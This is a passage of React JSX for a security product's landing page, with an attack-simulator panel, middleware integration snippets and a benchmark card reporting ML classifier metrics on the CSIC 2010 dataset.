        >
          Unifying deterministic signature rules with a dual-tree statistical pipeline (<span style={{ color: "#ffffff", fontWeight: 600 }}>Isolation Forest + Random Forest</span>).
          High-risk exploits are silently diverted into an in-memory POSIX honeypot in <span style={{ color: "#ffffff", fontWeight: 600 }}>2.41ms</span> with zero container breakout risk.
        </p>

        {/* Clean Hero CTA Button Row */}
        <div style={{ display: "flex", gap: 14, justifyContent: "center", marginBottom: 46, flexWrap: "wrap" }}>
          <button
            onClick={() => {
              playClickSound();
              onNav("dashboard");
            }}
            style={{
              padding: "12px 28px",
              background: "#2563eb",
              color: "#ffffff",
              border: "none",
              borderRadius: 8,
              fontSize: 13,
              fontWeight: 600,
              cursor: "pointer",
              fontFamily: "'Inter', sans-serif",
              boxShadow: "0 2px 10px rgba(37, 99, 235, 0.3)",
              transition: "background 0.15s",
            }}
            onMouseEnter={(e) => (e.currentTarget.style.background = "#1d4ed8")}
            onMouseLeave={(e) => (e.currentTarget.style.background = "#2563eb")}
          >
            Launch Live SOC Dashboard →
          </button>

          <a
            href="#simulator"
            onClick={() => playClickSound()}
            style={{
              textDecoration: "none",
              display: "inline-flex",
              alignItems: "center",
              padding: "12px 24px",
              background: "rgba(255, 255, 255, 0.04)",
              border: "1px solid rgba(255, 255, 255, 0.12)",
              color: "#e2e8f0",
              borderRadius: 8,
              fontSize: 13,
              fontWeight: 500,
              cursor: "pointer",
              fontFamily: "'Inter', sans-serif",
              transition: "all 0.15s",
            }}
            onMouseEnter={(e) => {
              e.currentTarget.style.background = "rgba(255, 255, 255, 0.08)";
              e.currentTarget.style.borderColor = "rgba(255, 255, 255, 0.2)";
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.background = "rgba(255, 255, 255, 0.04)";
              e.currentTarget.style.borderColor = "rgba(255, 255, 255, 0.12)";
            }}
          >
            Try Attack Simulator ↓
          </a>
        </div>

        {/* ── NEW: Interactive Live Attack & Honeypot Simulator ── */}
        <div
          id="simulator"
          style={{
            maxWidth: 1060,
            margin: "0 auto 60px",
            borderRadius: 24,
            backdropFilter: "blur(26px) saturate(190%)",
            WebkitBackdropFilter: "blur(26px) saturate(190%)",
            background: "rgba(8, 14, 28, 0.8)",
            border: "1px solid rgba(0, 240, 255, 0.4)",
            boxShadow: "0 10px 30px rgba(0, 0, 0, 0.4)",
            overflow: "hidden",
            textAlign: "left",
            position: "relative",
          }}
        >
          {/* Simulator Header */}
          <div
            style={{
              padding: "16px 24px",
              background: "rgba(0, 0, 0, 0.55)",
              borderBottom: "1px solid rgba(0, 240, 255, 0.3)",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              flexWrap: "wrap",
              gap: 12,
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
              <span style={{ width: 12, height: 12, borderRadius: "50%", background: "#ff5f56", display: "inline-block" }} />
              <span style={{ width: 12, height: 12, borderRadius: "50%", background: "#ffbd2e", display: "inline-block" }} />
              <span style={{ width: 12, height: 12, borderRadius: "50%", background: "#27c93f", display: "inline-block" }} />
              <span
                style={{
                  fontFamily: "'Inter', sans-serif",
                  fontSize: 12,
                  fontWeight: 800,
                  color: "#38bdf8",
                  letterSpacing: "1px",
                  marginLeft: 10,
                }}
              >
                INTERACTIVE THREAT INGRESS & DECEPTION SANDBOX
              </span>
            </div>
            <div style={{ fontSize: 11, fontFamily: "'Fira Code', monospace", color: "rgba(255, 255, 255, 0.6)" }}>
              SELECT AN EXPLOIT PAYLOAD TO TEST LIVE DEFENSE →
            </div>
          </div>

          {/* Preset Buttons Grid */}
          <div
            style={{
              padding: "18px 24px",
              background: "rgba(12, 18, 38, 0.65)",
              borderBottom: "1px solid rgba(255, 255, 255, 0.08)",
              display: "grid",
              gridTemplateColumns: "repeat(auto-fit, minmax(220px, 1fr))",
              gap: 12,
            }}
          >
            {Object.keys(attackPresets).map((key) => {
              const p = attackPresets[key];
              const isSelected = simulatorPayload === key;
              return (
                <button
                  key={key}
                  onClick={() => triggerSimulation(key)}
                  disabled={isSimulating}
                  style={{
                    padding: "12px 16px",
                    borderRadius: 14,
                    background: isSelected ? "rgba(0, 240, 255, 0.16)" : "rgba(255, 255, 255, 0.04)",
                    border: isSelected ? `1.5px solid ${p.badgeColor}` : "1px solid rgba(255, 255, 255, 0.12)",
                    boxShadow: isSelected ? `0 0 20px ${p.badgeColor}40` : "none",
                    cursor: isSimulating ? "wait" : "pointer",
                    textAlign: "left",
                    transition: "all 0.2s",
                  }}
                >
                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
                    <span style={{ fontSize: 12, fontWeight: 800, color: "#ffffff", fontFamily: "'Inter', sans-serif" }}>
                      {p.name}
                    </span>
                    <span
                      style={{
                        fontSize: 9,
                        fontFamily: "'Fira Code', monospace",
                        fontWeight: 700,
                        padding: "2px 6px",
                        borderRadius: 8,
                        background: `${p.badgeColor}22`,
                        color: p.badgeColor,
                        border: `1px solid ${p.badgeColor}55`,
                      }}
                    >
                      {p.badge}
                    </span>
                  </div>
                  <div
                    style={{
                      fontSize: 11,
                      fontFamily: "'Fira Code', monospace",
                      color: "rgba(255, 255, 255, 0.55)",
                      whiteSpace: "nowrap",
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                    }}
                  >
                    {p.payload}
                  </div>
                </button>
              );
            })}
          </div>

          {/* Live Pipeline Flow Animation */}
          <div style={{ padding: "24px", background: "rgba(5, 9, 20, 0.9)" }}>
            {/* Pipeline Stage Indicators */}
            <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: 14, marginBottom: 20 }}>
              {[
                { step: 1, title: "1. Feature Extraction", detail: "80-D Vector & Shannon Entropy" },
                { step: 2, title: "2. Dual AI ML Fusion", detail: "Isolation Forest + Random Forest" },
                { step: 3, title: "3. Verdict & Containment", detail: "In-Memory Linux Deception" }
              ].map((st) => {
                const isActive = simStep >= st.step;
                return (
                  <div
                    key={st.step}
                    style={{
                      padding: "10px 14px",
                      borderRadius: 12,
                      background: isActive ? "rgba(0, 240, 255, 0.12)" : "rgba(255, 255, 255, 0.03)",
                      border: isActive ? "1px solid #38bdf8" : "1px solid rgba(255, 255, 255, 0.08)",
                      boxShadow: isActive ? "0 0 14px rgba(0, 240, 255, 0.25)" : "none",
                      transition: "all 0.3s ease",
                    }}
                  >
                    <div
                      style={{
                        fontSize: 11,
                        fontWeight: 800,
                        fontFamily: "'Inter', sans-serif",
                        color: isActive ? "#38bdf8" : "rgba(255, 255, 255, 0.4)",
                      }}
                    >
                      {st.title}
                    </div>
                    <div style={{ fontSize: 10, color: "rgba(255, 255, 255, 0.5)", fontFamily: "'Fira Code', monospace" }}>
                      {st.detail}
                    </div>
                  </div>
                );
              })}
            </div>

            {/* Results Inspection Console */}
            <div
              style={{
                borderRadius: 16,
                background: "rgba(10, 16, 32, 0.8)",
                border: "1px solid rgba(0, 240, 255, 0.25)",
                padding: "20px 24px",
                fontFamily: "'Fira Code', monospace",
                fontSize: 12,
                color: "#e2e8f0",
                display: "grid",
                gridTemplateColumns: "repeat(auto-fit, minmax(260px, 1fr))",
                gap: 20,
              }}
            >
              <div>
                <div style={{ color: "rgba(0, 240, 255, 0.7)", fontSize: 11, marginBottom: 6, fontWeight: 700 }}>
                  [ INGRESS TRAFFIC PACKET ]
                </div>
                <div
                  style={{
                    background: "rgba(0, 0, 0, 0.6)",
                    padding: "12px",
                    borderRadius: 10,
                    border: "1px solid rgba(255, 255, 255, 0.1)",
                    color: "#38bdf8",
                    wordBreak: "break-all",
                    marginBottom: 12,
                  }}
                >
                  {attackPresets[simulatorPayload].payload}
                </div>
                <div style={{ display: "flex", gap: 16, fontSize: 11 }}>
                  <div>
                    <span style={{ color: "rgba(255, 255, 255, 0.5)" }}>SHANNON ENTROPY: </span>
                    <span style={{ color: "#22c55e", fontWeight: 700 }}>{simResult.entropy} bits</span>
                  </div>
                  <div>
                    <span style={{ color: "rgba(255, 255, 255, 0.5)" }}>LATENCY: </span>
                    <span style={{ color: "#22c55e", fontWeight: 700 }}>{simResult.latency}</span>
                  </div>
                </div>
              </div>

              <div>
                <div style={{ color: "rgba(0, 240, 255, 0.7)", fontSize: 11, marginBottom: 6, fontWeight: 700 }}>
                  [ DECISION MATRIX & ACTION ]
                </div>
                <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 10 }}>
                  <div
                    style={{
                      fontSize: 22,
                      fontWeight: 900,
                      fontFamily: "'Inter', sans-serif",
                      color: simResult.score > 80 ? "#ef4444" : "#22c55e",
                      
                    }}
                  >
                    SCORE {simResult.score}/100
                  </div>
                  <span
                    style={{
                      fontSize: 10,
                      fontWeight: 800,
                      padding: "4px 10px",
                      borderRadius: 12,
                      background: simResult.score > 80 ? "rgba(255, 0, 127, 0.2)" : "rgba(57, 255, 20, 0.2)",
                      color: simResult.score > 80 ? "#ef4444" : "#22c55e",
                      border: `1px solid ${simResult.score > 80 ? "#ef4444" : "#22c55e"}`,
                    }}
                  >
                    {simResult.verdict}
                  </span>
                </div>
                <div style={{ fontSize: 11, color: "rgba(255, 255, 255, 0.8)", marginBottom: 8 }}>
                  <strong>MITRE ATT&CK: </strong>
                  <span style={{ color: "#a855f7" }}>{simResult.mitre}</span>
                </div>
                <div style={{ fontSize: 11, color: "rgba(255, 255, 255, 0.65)", lineHeight: 1.5 }}>
                  {attackPresets[simulatorPayload].actionDesc}
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* ── Interactive Code Terminal (Syntax Highlighted) ── */}
        <div
          id="architecture"
          style={{
            maxWidth: 820,
            margin: "0 auto",
            borderRadius: 22,
            backdropFilter: "blur(24px) saturate(180%)",
            WebkitBackdropFilter: "blur(24px) saturate(180%)",
            background: "rgba(10, 15, 28, 0.78)",
            border: "1px solid rgba(0, 240, 255, 0.4)",
            boxShadow: "0 10px 30px rgba(0, 0, 0, 0.4)",
            overflow: "hidden",
            textAlign: "left",
          }}
        >
          {/* Terminal Titlebar */}
          <div
            style={{
              padding: "14px 22px",
              background: "rgba(0, 0, 0, 0.5)",
              borderBottom: "1px solid rgba(0, 240, 255, 0.25)",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              flexWrap: "wrap",
              gap: 10,
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <span style={{ width: 11, height: 11, borderRadius: "50%", background: "#ff5f56", display: "inline-block" }} />
              <span style={{ width: 11, height: 11, borderRadius: "50%", background: "#ffbd2e", display: "inline-block" }} />
              <span style={{ width: 11, height: 11, borderRadius: "50%", background: "#27c93f", display: "inline-block" }} />
              <span style={{ marginLeft: 10, fontFamily: "'Fira Code', monospace", fontSize: 12, color: "#38bdf8", fontWeight: 700 }}>
                guardian-edge-integration // 3-line inline guard
              </span>
            </div>

            {/* Language Switcher Tabs */}
            <div style={{ display: "flex", gap: 6 }}>
              {[
                { id: "fastapi", label: "Python (FastAPI)" },
                { id: "express", label: "Node.js (Express)" },
                { id: "caddy", label: "Caddy / Edge Proxy" },
              ].map((tab) => (
                <button
                  key={tab.id}
                  onClick={() => {
                    playClickSound();
                    setActiveTab(tab.id);
                  }}
                  style={{
                    padding: "5px 12px",
                    borderRadius: 14,
                    border: activeTab === tab.id ? "1px solid #38bdf8" : "1px solid transparent",
                    background: activeTab === tab.id ? "rgba(0, 240, 255, 0.2)" : "transparent",
                    color: activeTab === tab.id ? "#38bdf8" : "rgba(255, 255, 255, 0.55)",
                    fontSize: 11,
                    fontFamily: "'Fira Code', monospace",
                    cursor: "pointer",
                    transition: "all 0.2s",
                  }}
                >
                  {tab.label}
                </button>
              ))}
              <button
                onClick={() => {
                  const texts = {
                    fastapi: `pip install cyber-guardian\nfrom fastapi import FastAPI\nfrom cyber_guardian import GuardianMiddleware\napp = FastAPI()\napp.add_middleware(GuardianMiddleware, honeypot_divert=True)`,
                    express: `npm install @cyber-guardian/sdk\nconst express = require('express');\nconst { guardianGuard } = require('@cyber-guardian/sdk');\napp.use(guardianGuard({ silentHoneypot: true }));`,
                    caddy: `reverse_proxy @malicious http://127.0.0.1:8000/honeypot\nreverse_proxy http://127.0.0.1:5000`
                  };
                  copyCode(texts[activeTab]);
                }}
                style={{
                  marginLeft: 8,
                  padding: "5px 12px",
                  borderRadius: 14,
                  background: copied ? "rgba(57, 255, 20, 0.25)" : "rgba(255, 255, 255, 0.08)",
                  border: copied ? "1px solid #22c55e" : "1px solid rgba(255, 255, 255, 0.2)",
                  color: copied ? "#22c55e" : "rgba(255, 255, 255, 0.85)",
                  fontSize: 11,
                  fontFamily: "'Fira Code', monospace",
                  cursor: "pointer",
                }}
              >
                {copied ? "✓ COPIED" : "COPY CODE"}
              </button>
            </div>
          </div>

          {/* Terminal Body with Syntax Color */}
          <div
            style={{
              margin: 0,
              padding: "24px 28px",
              fontFamily: "'Fira Code', monospace",
              fontSize: 13,
              lineHeight: 1.7,
              background: "rgba(5, 8, 18, 0.88)",
              overflowX: "auto",
            }}
          >
            {activeTab === "fastapi" && (
              <div>
                <div style={{ color: "rgba(0, 240, 255, 0.5)" }}># 1. Install production pip package</div>
                <div style={{ color: "#f87171" }}>$ pip install cyber-guardian</div>
                <br />
                <div style={{ color: "rgba(0, 240, 255, 0.5)" }}># 2. Add sub-millisecond AI middleware</div>
                <div>
                  <span style={{ color: "#ef4444" }}>from</span> <span style={{ color: "#38bdf8" }}>fastapi</span> <span style={{ color: "#ef4444" }}>import</span> FastAPI
                </div>
                <div>
                  <span style={{ color: "#ef4444" }}>from</span> <span style={{ color: "#38bdf8" }}>cyber_guardian</span> <span style={{ color: "#ef4444" }}>import</span> GuardianMiddleware
                </div>
                <br />
                <div>app = FastAPI(title=<span style={{ color: "#22c55e" }}>"Production Gateway"</span>)</div>
                <br />
                <div>app.add_middleware(</div>
                <div style={{ paddingLeft: 20 }}>
                  GuardianMiddleware,<br />
                  api_key=<span style={{ color: "#22c55e" }}>"cg_live_98a72b4f9810a"</span>,<br />
                  honeypot_divert=<span style={{ color: "#ffaa00" }}>True</span>, <span style={{ color: "rgba(0, 240, 255, 0.5)" }}># In-Memory VFS sandbox</span><br />
                  threshold=<span style={{ color: "#ffaa00" }}>85</span> <span style={{ color: "rgba(0, 240, 255, 0.5)" }}># Dual AI Trigger Score</span>
                </div>
                <div>)</div>
              </div>
            )}

            {activeTab === "express" && (
              <div>
                <div style={{ color: "rgba(0, 240, 255, 0.5)" }}>// 1. Install Node.js SDK</div>
                <div style={{ color: "#f87171" }}>$ npm install @cyber-guardian/sdk</div>
                <br />
                <div style={{ color: "rgba(0, 240, 255, 0.5)" }}>// 2. Wrap Express router in 2 lines</div>
                <div>
                  <span style={{ color: "#ef4444" }}>const</span> express = <span style={{ color: "#38bdf8" }}>require</span>(<span style={{ color: "#22c55e" }}>'express'</span>);
                </div>
                <div>
                  <span style={{ color: "#ef4444" }}>const</span> &#123; guardianGuard &#125; = <span style={{ color: "#38bdf8" }}>require</span>(<span style={{ color: "#22c55e" }}>'@cyber-guardian/sdk'</span>);
                </div>
                <br />
                <div><span style={{ color: "#ef4444" }}>const</span> app = express();</div>
                <br />
                <div>app.use(guardianGuard(&#123;</div>
                <div style={{ paddingLeft: 20 }}>
                  apiKey: process.env.GUARDIAN_API_KEY,<br />
                  silentHoneypot: <span style={{ color: "#ffaa00" }}>true</span>,<br />
                  maxAllowedLatency: <span style={{ color: "#ffaa00" }}>3.5</span> <span style={{ color: "rgba(0, 240, 255, 0.5)" }}>// SLA milliseconds</span>
                </div>
                <div>&#125;));</div>
              </div>
            )}

            {activeTab === "caddy" && (
              <div>
                <div style={{ color: "rgba(0, 240, 255, 0.5)" }}># Caddyfile / Nginx Edge Reverse Proxy Mode</div>
                <div>api.enterprise.domain &#123;</div>
                <div style={{ paddingLeft: 20 }}>
                  <div style={{ color: "rgba(0, 240, 255, 0.5)" }}># Inline Guardian L7 Decision Engine</div>
                  forward_auth http://127.0.0.1:8000/api/decisions &#123;<br />
                  &nbsp;&nbsp;uri /v1/evaluate<br />
                  &nbsp;&nbsp;copy_headers X-Guardian-Score X-Guardian-Tier<br />
                  &#125;<br /><br />
                  <div style={{ color: "rgba(0, 240, 255, 0.5)" }}># Clean traffic routes to backend; Exploits route to in-memory Honeypot</div>
                  reverse_proxy @malicious http://127.0.0.1:8000/honeypot<br />
                  reverse_proxy http://127.0.0.1:5000
                </div>
                <div>&#125;</div>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* ── Engine Benchmark & Validation Strip ── */}
      <div
        id="metrics"
        style={{
          position: "relative",
          zIndex: 2,
          borderTop: "1px solid rgba(255, 255, 255, 0.08)",
          borderBottom: "1px solid rgba(255, 255, 255, 0.08)",
          padding: "48px 24px",
          background: "#090d16",
        }}
      >
        {/* 5 KPI Metric Cards */}
        <div
          style={{
            maxWidth: 1200,
            margin: "0 auto",
            display: "grid",
            gridTemplateColumns: "repeat(auto-fit, minmax(210px, 1fr))",
            gap: 16,
            textAlign: "center",
          }}
        >
          {metrics.map((m) => (
            <div
              key={m.label}
              style={{
                padding: "20px 16px",
                borderRadius: 12,
                background: "rgba(255, 255, 255, 0.02)",
                border: "1px solid rgba(255, 255, 255, 0.07)",
                transition: "border-color 0.2s, background 0.2s",
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.borderColor = "rgba(56, 189, 248, 0.4)";
                e.currentTarget.style.background = "rgba(255, 255, 255, 0.04)";
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.borderColor = "rgba(255, 255, 255, 0.07)";
                e.currentTarget.style.background = "rgba(255, 255, 255, 0.02)";
              }}
            >
              <div
                style={{
                  fontSize: 32,
                  fontWeight: 700,
                  fontFamily: "'Inter', system-ui, sans-serif",
                  color: "#ffffff",
                  letterSpacing: "-0.5px",
                  marginBottom: 6,
                }}
              >
                {m.val}
              </div>
              <div
                style={{
                  fontSize: 12,
                  fontWeight: 600,
                  fontFamily: "'Inter', sans-serif",
                  color: "#94a3b8",
                  letterSpacing: "0.5px",
                  marginBottom: 4,
                }}
              >
                {m.label}
              </div>
              <div style={{ fontSize: 11, color: "#64748b", fontFamily: "'Inter', sans-serif" }}>
                {m.sub}
              </div>
            </div>
          ))}
        </div>

        {/* ── Official Benchmark & Mathematical Formulation Card ── */}
        <div
          style={{
            maxWidth: 1200,
            margin: "32px auto 0",
            padding: "28px 32px",
            borderRadius: 14,
            background: "#0c111d",
            border: "1px solid rgba(255, 255, 255, 0.08)",
          }}
        >
          {/* Section Header */}
          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              flexWrap: "wrap",
              gap: 12,
              marginBottom: 24,
              borderBottom: "1px solid rgba(255, 255, 255, 0.07)",
              paddingBottom: 16,
            }}
          >
            <div>
              <span
                style={{
                  display: "inline-block",
                  padding: "4px 10px",
                  borderRadius: 6,
                  fontSize: 11,
                  fontWeight: 600,
                  fontFamily: "'Inter', sans-serif",
                  background: "rgba(56, 189, 248, 0.08)",
                  color: "#38bdf8",
                  border: "1px solid rgba(56, 189, 248, 0.2)",
                  marginBottom: 8,
                }}
              >
                ● CSIC 2010 MODEL VALIDATION DATA
              </span>
              <h3
                style={{
                  margin: 0,
                  fontSize: 18,
                  fontWeight: 700,
                  fontFamily: "'Inter', sans-serif",
                  color: "#ffffff",
                }}
              >
                Dual-Tree Threat Classifier Performance
              </h3>
            </div>
            <div
              style={{
                fontSize: 12,
                color: "#94a3b8",
                fontFamily: "'Inter', sans-serif",
                background: "rgba(255, 255, 255, 0.03)",
                padding: "6px 12px",
                borderRadius: 6,
                border: "1px solid rgba(255, 255, 255, 0.06)",
              }}
            >
              Test Split: 4,800 HTTP Payloads (2,400 Benign · 2,400 Malicious)
            </div>
          </div>

          {/* Two-Column Grid: Left (List + Insights) | Right (Formula & Confusion Matrix) */}
          <div
            style={{
              display: "grid",
              gridTemplateColumns: "repeat(auto-fit, minmax(320px, 1fr))",
              gap: 24,
              alignItems: "stretch",
            }}
          >
            {/* Left: Metric List with Intuitive Explanations */}
            <div
              style={{
                display: "flex",
                flexDirection: "column",
                gap: 10,
                justifyContent: "center",
              }}
            >
              {/* Item 1: Overall Accuracy */}
              <div
                style={{
                  padding: "12px 16px",
                  borderRadius: 8,
                  background: "rgba(255, 255, 255, 0.02)",
                  border: "1px solid rgba(255, 255, 255, 0.06)",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                  <span style={{ color: "#38bdf8", fontSize: 12 }}>●</span>
                  <span style={{ fontSize: 14, fontWeight: 600, color: "#ffffff", fontFamily: "'Inter', sans-serif" }}>
                    Overall Accuracy
                  </span>
                </div>
                <span
                  style={{
                    fontSize: 18,
                    fontWeight: 700,
                    fontFamily: "'Inter', sans-serif",
                    color: "#ffffff",
                  }}
                >
                  94.04%
                </span>
              </div>

              {/* Item 2: Precision */}
              <div
                style={{
                  padding: "12px 16px",
                  borderRadius: 8,
                  background: "rgba(255, 255, 255, 0.02)",
                  border: "1px solid rgba(255, 255, 255, 0.06)",
                }}
              >
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    marginBottom: 4,
                  }}
                >
                  <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                    <span style={{ color: "#38bdf8", fontSize: 12 }}>●</span>
                    <span style={{ fontSize: 14, fontWeight: 600, color: "#ffffff", fontFamily: "'Inter', sans-serif" }}>
                      Precision
                    </span>
                  </div>
                  <span
                    style={{
                      fontSize: 18,
                      fontWeight: 700,
                      fontFamily: "'Inter', sans-serif",
                      color: "#ffffff",
                    }}
                  >
                    96.24%
                  </span>
                </div>
                <div
                  style={{
                    fontSize: 12,
                    color: "#94a3b8",
                    paddingLeft: 22,
                    fontFamily: "'Inter', sans-serif",
                    fontStyle: "italic",
                  }}
                >
                  (Matlab jab model bolta hai ki "Yeh Attack hai", toh 96.2% time woh bilkul sahi hota hai)
                </div>
              </div>

              {/* Item 3: Recall */}
              <div
                style={{
                  padding: "12px 16px",
                  borderRadius: 8,
                  background: "rgba(255, 255, 255, 0.02)",
                  border: "1px solid rgba(255, 255, 255, 0.06)",
                }}
              >
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    marginBottom: 4,
                  }}
                >
                  <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                    <span style={{ color: "#38bdf8", fontSize: 12 }}>●</span>
                    <span style={{ fontSize: 14, fontWeight: 600, color: "#ffffff", fontFamily: "'Inter', sans-serif" }}>
                      Recall
                    </span>
                  </div>
                  <span
                    style={{
                      fontSize: 18,
                      fontWeight: 700,
                      fontFamily: "'Inter', sans-serif",
                      color: "#ffffff",
                    }}
                  >
                    91.67%
                  </span>
                </div>
                <div
                  style={{
                    fontSize: 12,
                    color: "#94a3b8",
                    paddingLeft: 22,
                    fontFamily: "'Inter', sans-serif",
                    fontStyle: "italic",
                  }}
                >
                  (91.7% attacks ko model ne pakda)
                </div>
              </div>

              {/* Item 4: False Positive Rate (FPR) */}
              <div
                style={{
                  padding: "12px 16px",
                  borderRadius: 8,
                  background: "rgba(255, 255, 255, 0.02)",
                  border: "1px solid rgba(255, 255, 255, 0.06)",
                }}
              >
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    marginBottom: 4,
                  }}
                >
                  <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                    <span style={{ color: "#38bdf8", fontSize: 12 }}>●</span>
                    <span style={{ fontSize: 14, fontWeight: 600, color: "#ffffff", fontFamily: "'Inter', sans-serif" }}>
                      False Positive Rate (FPR)
                    </span>
                  </div>
                  <span
                    style={{
                      fontSize: 18,
                      fontWeight: 700,
                      fontFamily: "'Inter', sans-serif",
                      color: "#38bdf8",
                    }}
                  >
                    3.58%
                  </span>
                </div>
                <div
                  style={{
                    fontSize: 12,
                    color: "#94a3b8",
                    paddingLeft: 22,
                    fontFamily: "'Inter', sans-serif",
                    fontStyle: "italic",
                  }}
                >
                  (Sirf 3.5% normal users ko galti se shaq ke dayre me liya, jo industry standard &le; 5% se behtar hai)
                </div>
              </div>

              {/* Item 5: F1-Score */}
              <div
                style={{
                  padding: "12px 16px",
                  borderRadius: 8,
                  background: "rgba(255, 255, 255, 0.02)",
                  border: "1px solid rgba(255, 255, 255, 0.06)",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                  <span style={{ color: "#38bdf8", fontSize: 12 }}>●</span>
                  <span style={{ fontSize: 14, fontWeight: 600, color: "#ffffff", fontFamily: "'Inter', sans-serif" }}>
                    F1-Score
                  </span>
                </div>
                <span
                  style={{
                    fontSize: 18,
                    fontWeight: 700,
                    fontFamily: "'Inter', sans-serif",
                    color: "#ffffff",
                  }}
                >
                  0.939
                </span>
              </div>
            </div>

            {/* Right: Math Formula & Confusion Matrix Box */}
            <div
              style={{
                display: "flex",
                flexDirection: "column",
                gap: 14,
                justifyContent: "space-between",
              }}
            >
              {/* Mathematical Formulation Card */}
              <div
                style={{
                  padding: "20px",
                  borderRadius: 10,
                  background: "rgba(0, 0, 0, 0.35)",
                  border: "1px solid rgba(255, 255, 255, 0.08)",
                  display: "flex",
                  flexDirection: "column",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <div
                  style={{
                    fontSize: 11,
                    fontFamily: "'Inter', sans-serif",
                    letterSpacing: "0.8px",
                    color: "#94a3b8",
                    fontWeight: 600,
                    marginBottom: 14,
                  }}
                >
                  MATHEMATICAL ACCURACY FORMULATION
                </div>

                {/* Mathematical Equation Display */}
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    gap: 12,
                    fontSize: 18,
                    fontWeight: 600,
                    color: "#ffffff",
                    fontFamily: "'Inter', monospace",
                    flexWrap: "wrap",
                    justifyContent: "center",
                  }}
                >
                  <span style={{ color: "#38bdf8", fontStyle: "italic" }}>Accuracy</span>
                  <span style={{ color: "#94a3b8" }}>=</span>
                  
                  {/* Fraction 1: (TP + TN) / Total */}
                  <div style={{ display: "inline-flex", flexDirection: "column", alignItems: "center" }}>
                    <span style={{ borderBottom: "1px solid rgba(255, 255, 255, 0.4)", paddingBottom: 2, paddingLeft: 6, paddingRight: 6 }}>
                      TP + TN
                    </span>
                    <span style={{ paddingTop: 2, color: "#94a3b8" }}>
                      Total
                    </span>
                  </div>

                  <span style={{ color: "#94a3b8" }}>=</span>

                  {/* Fraction 2: (2200 + 2314) / 4800 */}
                  <div style={{ display: "inline-flex", flexDirection: "column", alignItems: "center" }}>
                    <span style={{ borderBottom: "1px solid rgba(255, 255, 255, 0.4)", paddingBottom: 2, paddingLeft: 6, paddingRight: 6, color: "#ffffff" }}>
                      2200 + 2314
                    </span>
                    <span style={{ paddingTop: 2, color: "#94a3b8" }}>
                      4800
                    </span>
                  </div>

                  <span style={{ color: "#94a3b8" }}>&approx;</span>
                  
                  <span
                    style={{
                      fontSize: 22,
                      fontWeight: 700,
                      fontFamily: "'Inter', sans-serif",
                      color: "#38bdf8",
                    }}
                  >
                    94.04%
                  </span>
                </div>
              </div>

              {/* Confusion Matrix Mini Grid */}
              <div
                style={{
                  padding: "16px 20px",
                  borderRadius: 10,
                  background: "rgba(255, 255, 255, 0.02)",
                  border: "1px solid rgba(255, 255, 255, 0.06)",
                }}
              >
                <div
                  style={{
                    fontSize: 11,
                    fontFamily: "'Inter', sans-serif",
                    letterSpacing: "0.5px",
                    color: "#94a3b8",
                    fontWeight: 600,
                    marginBottom: 10,
                    textAlign: "center",
                  }}
                >
                  CONFUSION MATRIX (4,800 SAMPLES)
                </div>
                <div
                  style={{
                    display: "grid",
                    gridTemplateColumns: "1fr 1fr",
                    gap: 8,
                    textAlign: "center",
                  }}
                >
                  <div
                    style={{
                      background: "rgba(255, 255, 255, 0.02)",
                      border: "1px solid rgba(255, 255, 255, 0.06)",
                      borderRadius: 8,
                      padding: "8px 10px",
                    }}
                  >
                    <div style={{ fontSize: 11, color: "#94a3b8" }}>True Positive (TP)</div>
                    <div style={{ fontSize: 16, fontWeight: 700, color: "#ffffff", fontFamily: "'Inter', sans-serif" }}>2,200</div>
                    <div style={{ fontSize: 10, color: "#38bdf8" }}>Attacks Trapped</div>
                  </div>
                  <div
                    style={{
                      background: "rgba(255, 255, 255, 0.02)",
                      border: "1px solid rgba(255, 255, 255, 0.06)",
                      borderRadius: 8,
                      padding: "8px 10px",
                    }}
                  >
                    <div style={{ fontSize: 11, color: "#94a3b8" }}>True Negative (TN)</div>
                    <div style={{ fontSize: 16, fontWeight: 700, color: "#ffffff", fontFamily: "'Inter', sans-serif" }}>2,314</div>
                    <div style={{ fontSize: 10, color: "#94a3b8" }}>Normal Traffic Passed</div>
                  </div>
                  <div
                    style={{
                      background: "rgba(255, 255, 255, 0.02)",
                      border: "1px solid rgba(255, 255, 255, 0.06)",
                      borderRadius: 8,
                      padding: "8px 10px",
                    }}
                  >
                    <div style={{ fontSize: 11, color: "#94a3b8" }}>False Positive (FP)</div>
                    <div style={{ fontSize: 16, fontWeight: 700, color: "#ffffff", fontFamily: "'Inter', sans-serif" }}>86</div>
                    <div style={{ fontSize: 10, color: "#94a3b8" }}>3.58% Normal Audited</div>
                  </div>
                  <div
                    style={{
                      background: "rgba(255, 255, 255, 0.02)",
                      border: "1px solid rgba(255, 255, 255, 0.06)",
                      borderRadius: 8,
                      padding: "8px 10px",
                    }}
                  >
                    <div style={{ fontSize: 11, color: "#94a3b8" }}>False Negative (FN)</div>
                    <div style={{ fontSize: 16, fontWeight: 700, color: "#ffffff", fontFamily: "'Inter', sans-serif" }}>200</div>
                    <div style={{ fontSize: 10, color: "#94a3b8" }}>Filtered by Rule Base</div>
